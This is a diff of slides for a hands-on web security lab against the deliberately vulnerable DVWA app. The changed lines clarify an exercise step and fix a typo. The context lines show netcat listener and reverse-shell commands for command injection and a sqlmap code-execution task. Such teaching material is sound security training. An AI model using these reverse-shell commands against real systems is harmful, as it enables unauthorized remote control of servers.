@@ -845,7 +845,7 @@ comment out the rest of the line:
 4. Start a local netcat listener in a terminal and use the command injection to launch a reverse shell from the webserver
 	- Netcat listener: `nc -l -v -p 4444`
 	- Reverse shell: `nc -e /bin/bash 127.0.0.1 4444`
-5. Change DVWA security level from "medium" to "high" and attempt to exploit the vulnerability again
+5. Change DVWA security level from "medium" to "high" and attempt to exploit the vulnerability again (you don't need to get reverse shell)
 ---
 class: middle, center
 # Command injection mitigation
@@ -1076,7 +1076,7 @@ FROM
 11. Get remote code execution again using `sqlmap`, this time while proxying through burp. How does `sqlmap` get code execution?
 
 note: `sqlmap` caches previous responses locally. Run `sqlmap --purge-output`.
-If things get wrid, and make sure that your session is still valid
+If things get weird, and make sure that your session is still valid
 
 ---
 class: middle, center
